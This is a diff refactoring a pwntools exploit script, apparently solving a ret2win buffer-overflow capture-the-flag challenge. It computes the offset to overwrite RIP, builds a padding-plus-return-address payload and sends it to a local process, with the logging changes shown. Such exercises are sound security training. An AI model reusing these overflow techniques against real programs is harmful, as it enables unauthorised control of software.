@@ -16,30 +16,34 @@ def exploit(binary_path):
 
     # Create an ELF object and start a new process
     elf = context.binary = ELF(binary_path)
-    io = process(elf.path)
 
-    # Get the address of the ret2win function
-    ret2win_addr = elf.symbols["ret2win"]
-    print("[DEBUG] The address of ret2win() is " + str(hex(ret2win_addr)))
+    # Set log level to debug if debugging is needed
+    context.log_level = 'debug'
 
-    # Get the offset by calling the find_offset function
-    offset = find_offset(binary_path)
-    print("[DEBUG] The offset calculated overwrite RIP is " + str(offset) + " bytes")
+    # Automatically close the process when the "with" block is exited
+    with process(elf.path) as io:
 
-    # Construct the payload
-    payload = b'A' * offset
-    payload += p32(ret2win_addr)
-    print("[DEBUG] The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
-    
-    # Send the payload and print the output
-    io.sendline(payload)
-    log.info(io.clean())
-    log.success('(SUCCESS) The flag has been sucessfully captured!')
+        # Get the address of the ret2win function
+        ret2win_addr = elf.symbols["ret2win"]
+        log.debug(f"The address of ret2win() is {hex(ret2win_addr)}")
 
-    # Close the process
-    io.close()
+        # Get the offset by calling the find_offset function
+        offset = find_offset(binary_path)
+        log.debug(f"The offset calculated to overwrite RIP is {offset} bytes")
+
+        # Construct the payload
+        payload = b'i' * offset
+        payload += p32(ret2win_addr)
+        log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
+        
+        # Send the payload and print the output
+        io.sendline(payload)
+        log.info(io.clean())
 
 def find_offset(binary_path):
+
+    # Save the original log level which would be either 'info' or 'debug'
+    log_level = context.log_level
 
     # Disable logging for offset calculations
     context.log_level = 'error'
@@ -63,8 +67,8 @@ def find_offset(binary_path):
     # Close the process that calculated the offset
     io.close()
 
-    # Enable log level and output a result
-    context.log_level = 'info'
+    # Revert the log level to the original value
+    context.log_level = log_level
 
     return offset
 
